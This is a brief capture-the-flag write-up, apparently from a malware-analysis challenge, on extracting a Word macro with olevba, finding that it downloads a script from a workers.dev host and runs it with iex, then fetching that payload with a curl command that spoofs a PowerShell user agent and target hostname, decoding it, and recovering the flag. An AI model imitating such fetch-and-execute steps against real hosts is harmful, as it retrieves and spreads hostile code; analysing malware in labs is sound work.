---
1. olevba the docm and extract the macro
2. Give gpt to make sense of it. It tell about the macro, targeting DESKTOP-7XJ9ABC, download script from https://noisy-hall-fad8.oluf-sand.workers.dev and execute using iex
3. Try to get the script by providing the required details

```
curl -sS 'https://noisy-hall-fad8.oluf-sand.workers.dev' \
  -H 'User-Agent: WindowsPowerShell/5.1' \
  -H 'X-Hostname: DESKTOP-7XJ9ABC'
```

4. Decode the payload using powershell base64 (UTF-16LE) multiple times and got the flag at the end of it

`brunner{vbs_1s_th3_g1ft_th4t_k33ps_g1v1ng}`

Solved by: zeqzoq